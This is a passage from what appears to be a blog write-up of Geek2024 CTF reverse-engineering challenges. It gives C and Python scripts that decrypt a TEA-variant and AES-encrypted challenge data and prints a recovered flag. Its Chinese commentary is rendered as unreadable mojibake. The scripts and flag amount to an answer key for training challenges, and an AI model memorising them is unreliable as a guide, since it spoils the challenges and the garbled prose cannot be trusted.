src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731857724576-3ca1a863-8cf9-4ca5-bac0-53045be9b033.png" class="" title="img"><p>ä¸ç†Ÿæ‚‰çš„è¯å°è¯•å†™æ­£å‘åŠ å¯†æ¯”è¾ƒæ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">int32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>];<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">1640531527</span>;<br><span class="hljs-type">uint32_t</span> sum = (<span class="hljs-number">-32</span>)*delta;<br><span class="hljs-comment">//int32_t sum=0;</span><br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">31</span>; i &gt;=<span class="hljs-number">0</span>; i--) &#123;<br>    <span class="hljs-comment">//printf(&quot;%d,%d,%d\n&quot;,v0,v1,sum);</span><br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])^(sum+i);<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>])^(sum+i);<br><span class="hljs-comment">//        v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3])^(sum+i);</span><br><span class="hljs-comment">//        sum -= delta;</span><br><span class="hljs-comment">//        v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3])^(sum+i);</span><br><span class="hljs-comment">//printf(&quot;%d,%d,%d\n&quot;,v0,v1,sum);</span><br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-string">&#x27;G&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;K&#x27;</span>&#125;;<br>    <span class="hljs-type">int32_t</span> enc[] = &#123;<span class="hljs-number">0xf1f186b2</span>,<span class="hljs-number">0x5a96c782</span>,<span class="hljs-number">0xe6c63a0b</span>,<span class="hljs-number">0x70b61b5c</span>,<span class="hljs-number">0xed6bf848</span>,<span class="hljs-number">0x89700d6b</span>,<span class="hljs-number">0x09381b5c</span>,<span class="hljs-number">0xcb2f24fa</span>,<span class="hljs-number">0xb1c79e79</span>,<span class="hljs-number">0x6d822d9c</span>,<span class="hljs-number">0xdcc55f76</span>,<span class="hljs-number">0x0f780e75</span>,<span class="hljs-number">0x0d65c4af</span>,<span class="hljs-number">0xb89084a9</span>,<span class="hljs-number">0xe978c382</span>,<span class="hljs-number">0x7a8dd810</span>,<span class="hljs-number">0x91f28df3</span>,<span class="hljs-number">0xa84dbaca</span>,<span class="hljs-number">0xb4d75f75</span>,<span class="hljs-number">0xf19af8e5</span>,<span class="hljs-number">0xb90f80fc</span>,<span class="hljs-number">0xfc10a5c3</span>,<span class="hljs-number">0xd20679fb</span>,<span class="hljs-number">0x2bc734c8</span>,<span class="hljs-number">0xccb31c92</span>,<span class="hljs-number">0x1ac52ad3</span>,<span class="hljs-number">0xe7f922b7</span>,<span class="hljs-number">0x2e24d923</span>,<span class="hljs-number">0xfb4ce9f5</span>,<span class="hljs-number">0x3548a9e5</span>,<span class="hljs-number">0x71ebc25a</span>,<span class="hljs-number">0xdf38862e</span>,<span class="hljs-number">0x10059186</span>,<span class="hljs-number">0x32750946</span>,<span class="hljs-number">0x3dd4d54c</span>,<span class="hljs-number">0x905abc36</span>,<span class="hljs-number">0xc26d5312</span>,<span class="hljs-number">0xd2cd42c0</span>,<span class="hljs-number">0x772d99e5</span>,<span class="hljs-number">0x0cd4c466</span>,<span class="hljs-number">0x5c3178d6</span>,<span class="hljs-number">0x3a7ffe71</span>,<span class="hljs-number">0xada251c0</span>,<span class="hljs-number">0x70568d5a</span>,<span class="hljs-number">0x5798c292</span>,<span class="hljs-number">0x1ec0f7fc</span>,<span class="hljs-number">0x3ae9d841</span>,<span class="hljs-number">0x84607629</span>,<span class="hljs-number">0x30ca6a2d</span>,<span class="hljs-number">0xccef51d2</span>,<span class="hljs-number">0xa1a80854</span>,<span class="hljs-number">0x91b0f82d</span>,<span class="hljs-number">0x686ca347</span>,<span class="hljs-number">0x74c52d0f</span>,<span class="hljs-number">0x0f26449f</span>,<span class="hljs-number">0xc28d362c</span>,<span class="hljs-number">0x86f3311b</span>,<span class="hljs-number">0x8adc4fb1</span>,<span class="hljs-number">0xa4497e34</span>,<span class="hljs-number">0xe0f0915d</span>&#125;;<br>    <span class="hljs-comment">//printf(&quot;%d&quot;,strlen(enc));</span><br><span class="hljs-comment">//int32_t enc[] = &#123;&#x27;S&#x27;,&#x27;Y&#x27;&#125;;</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">60</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">60</span>; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i]&amp;<span class="hljs-number">0x7f</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//SYC&#123;g0od_j0b_wweLCoMeToooSSSyC_zz_1_et3start_yoUr_j0urney!!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h2><p>å»é™¤èŠ±æŒ‡ä»¤åå‘ç°æ˜¯aes</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731910932918-8bad1bd8-176b-4d19-a0c9-0b96934f76b8.png" class="" title="img"><p>keyå’Œivå¯ä»¥è°ƒè¯•è·å¾—ï¼Œè¿™é‡Œçš„keyä¸æ˜¯phKeyä¹Ÿä¸æ˜¯phKeyä½œä¸ºåœ°å€å¯¹åº”çš„å†…å®¹ï¼Œè€Œæ˜¯ä¸Šé¢pbSecretçš„å€¼</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731904125101-dd08553b-64ef-4ff7-8cdb-807437ae53f2.png" class="" title="img"><p>æ ‡å‡†çš„aes</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731910866145-1397182b-26b2-4528-8aba-b09d9dc4633b.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> struct<br><br>pbSecret = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xAD</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xCA</span>,<br>                  <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xDA</span>])<br><br>initial_iv = struct.pack(<span class="hljs-string">&#x27;&lt;4I&#x27;</span>, <span class="hljs-number">0x941E70C1</span>, <span class="hljs-number">0x013142F4</span>, <span class="hljs-number">0x550A3FB0</span>, <span class="hljs-number">0xD399FFA1</span>)<br>v10 = struct.pack(<span class="hljs-string">&#x27;&lt;2Q&#x27;</span>, <span class="hljs-number">0xFEF76ECE6FA34BA2</span>, <span class="hljs-number">0x67735D6CF76837EC</span>)<br><br><br>final_iv = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(initial_iv, v10))<br><br>v9 = [<br>    <span class="hljs-number">0x754CE0DD</span>, <span class="hljs-number">0xB8143397</span>, <span class="hljs-number">0x1119B617</span>, <span class="hljs-number">0x23608A61</span>,<br>    <span class="hljs-number">0x1AE21646</span>, <span class="hljs-number">0x265BC365</span>, <span class="hljs-number">0x30ADF568</span>, <span class="hljs-number">0xC64BEEB1</span>,<br>    <span class="hljs-number">0xBB9EB5AB</span>, <span class="hljs-number">0xC24A9573</span>, <span class="hljs-number">0xA9CBEF78</span>, <span class="hljs-number">0xA0E171BE</span><br>]<br>ciphertext = <span class="hljs-string">b&#x27;&#x27;</span>.join(struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> v9)<br><br><br>cipher = AES.new(pbSecret, AES.MODE_CBC, final_iv)<br>decrypted = cipher.decrypt(ciphertext)<br><br><span class="hljs-comment"># å»é™¤å¡«å……ï¼ˆPKCS#7ï¼‰</span><br>pad_len = decrypted[-<span class="hljs-number">1</span>]<br>plaintext = decrypted[:-pad_len]<br><br><br><span class="hljs-built_in">print</span>(plaintext.decode())<br></code></pre></td></tr></table></figure><h2 id="Aes"><a href="#Aes" class="headerlink" title="Aes!"></a>Aes!</h2><p>æ ‡å‡†aesï¼Œç›´æ¥è§£å¯†ä¸å¯¹ï¼Œè·Ÿè¸ªä¸€ä¸‹æµç¨‹å‘ç°æ²¡åˆ«çš„æ“ä½œæˆ–è€…ä¿®æ”¹æ•°æ®</p><img src="/2024/11/24/Geek2024%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1731741693528-d3ecf475-b878-4591-8537-5223d5d0aab2.png" class="" title="img"><p>findcryptä¸€ä¸‹å‘ç°æ²¡è¯†åˆ«åˆ°ï¼Œå¤§æ¦‚ç‡å¯èƒ½æ˜¯ä¿®æ”¹äº†sç›’</p><p>ç”¨ä¸€ä¸‹ä¿®æ”¹sç›’çš„ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">IAES</span>:<br>    <span class="hljs-keyword">global</span> new_s_box<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.Nk = <span class="hljs-number">4</span><br>        self.Nb = <span class="hljs-number">4</span><br>        self.Nr = <span class="hljs-number">10</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Nb = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Nb = Nb + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Nb<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Inv_arrays</span>(<span class="hljs-params">self, raws</span>):<br>        Inv_raws = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            Inv_raws = Inv_raws + [raws[<span class="hljs-number">4</span> * <span class="hljs-number">0</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">1</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">2</span> + i], raws[<span class="hljs-number">4</span> * <span class="hljs-number">3</span> + i]]<br>        <span class="hljs-keyword">return</span> Inv_raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">self, raws</span>):<br>        raws = self.Inv_arrays(raws)<br>        raws = <span class="hljs-string">&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>).<span class="hljs-built_in">hex</span>() <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> raws])<br>        <span class="hljs-comment">#print(raws)</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">view2</span>(<span class="hljs-params">self, <span class="hljs-built_in">list</span></span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">format</span>(<span class="hljs-built_in">list</span>[i], <span class="hljs-string">&#x27;2x&#x27;</span>), end=<span class="hljs-string">&#x27; &#x27;</span>)<br>            <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">3</span> == <span class="hljs-number">3</span>:  <span class="hljs-comment"># i%4 == 3</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-comment">#print(&#x27;\n&#x27;, end=&#x27;&#x27;)</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">AddRoundKey</span>(<span class="hljs-params">self, raws, Keys</span>):<br>        AddRoundKey = []<br>        <span class="hljs-keyword">for</span> raw, Key <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(raws, Keys):<br>            AddRoundKey.append(raw ^ Key)<br>        <span class="hljs-keyword">return</span> AddRoundKey<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubBytes</span>(<span class="hljs-params">self, raws</span>):<br>        S_box=new_s_box<br>        raws_S_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_S_box.append(S_box[raw])<br>        <span class="hljs-keyword">return</span> raws_S_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvSubBytes</span>(<span class="hljs-params">self, raws,inv_s_box</span>):<br>        IS_box = inv_s_box<br>        raws_IS_box = []<br>        <span class="hljs-keyword">for</span> raw <span class="hljs-keyword">in</span> raws:<br>            raws_IS_box.append(IS_box[raw])<br>        <span class="hljs-keyword">return</span> raws_IS_box<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvShiftRows</span>(<span class="hljs-params">self, raws</span>):<br>        s13 = raws.pop(<span class="hljs-number">7</span>)<br>        raws.insert(<span class="hljs-number">4</span>, s13)<br>        s2223 = raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>]<br>        raws[<span class="hljs-number">8</span>:<span class="hljs-number">0</span>] = s2223<br>        s313233 = raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-keyword">del</span> raws[<span class="hljs-number">13</span>:<span class="hljs-number">16</span>]<br>        raws[<span class="hljs-number">12</span>:<span class="hljs-number">0</span>] = s313233<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GMUL</span>(<span class="hljs-params">self, a, b</span>):  <span class="hljs-comment"># Russian Peasant Multiplication algorithm</span><br>        p = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> a <span class="hljs-keyword">and</span> b:<br>            <span class="hljs-keyword">if</span> b &amp; <span class="hljs-number">1</span>:  <span class="hljs-comment"># b%2</span><br>                p = p ^ a<br>            <span class="hljs-keyword">if</span> a &amp; <span class="hljs-number">0x80</span>:  <span class="hljs-comment"># a=a*x^7(a&gt;0),a &gt;= 2**7(128)</span><br>                a = (a &lt;&lt; <span class="hljs-number">1</span>) ^ <span class="hljs-number">0x11b</span>  <span class="hljs-comment"># 0x11b = x^8 + x^4 + x^3 + x + 1 (0b100011011)</span><br>            <span class="hljs-keyword">else</span>:<br>                a = a &lt;&lt; <span class="hljs-number">1</span><br>            b = b &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> p<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">InvMixColumns</span>(<span class="hljs-params">self, raws</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i], \<br>                raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i] \<br>                = \<br>                self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i]), \<br>                self.GMUL(<span class="hljs-number">0x0b</span>, raws[<span class="hljs-number">0</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0d</span>, raws[<span class="hljs-number">1</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x09</span>, raws[<br>                    <span class="hljs-number">2</span> * <span class="hljs-number">4</span> + i]) ^ self.GMUL(<span class="hljs-number">0x0e</span>, raws[<span class="hljs-number">3</span> * <span class="hljs-number">4</span> + i])<br>        <span class="hljs-keyword">return</span> raws<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">RotWord</span>(<span class="hljs-params">self, temp</span>):<br>        b0 = temp.pop(<span class="hljs-number">0</span>)<br>        temp.insert(<span class="hljs-number">3</span>, b0)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SubWord</span>(<span class="hljs-params">self, temp</span>):<br>        temp = self.SubBytes(temp)<br>        <span class="hljs-keyword">return</span> temp<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyExpansion</span>(<span class="hljs-params">self, key</span>):<br>        i = <span class="hljs-number">0</span><br>        w = [[<span class="hljs-number">0</span>]] * (self.Nb * (self.Nr + <span class="hljs-number">1</span>))<br>        Rcon = [[<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x04</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x20</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x1B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>],<br>                [<span class="hljs-number">0x36</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br>                ]<br>        <span class="hljs-keyword">while</span> i &lt; self.Nk:<br>            w[i] = ([key[<span class="hljs-number">4</span> * i], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>], key[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>]])<br>            i = i + <span class="hljs-number">1</span><br><br>        i = self.Nk<br><br>        <span class="hljs-keyword">while</span> i &lt; self.Nb * (self.Nr + <span class="hljs-number">1</span>):<br>            temp = w[i - <span class="hljs-number">1</span>].copy()<br>            <span class="hljs-keyword">if</span> i % self.Nk == <span class="hljs-number">0</span>:<br>                temp = self.SubWord(self.RotWord(temp))<br>                temp2 = []<br>         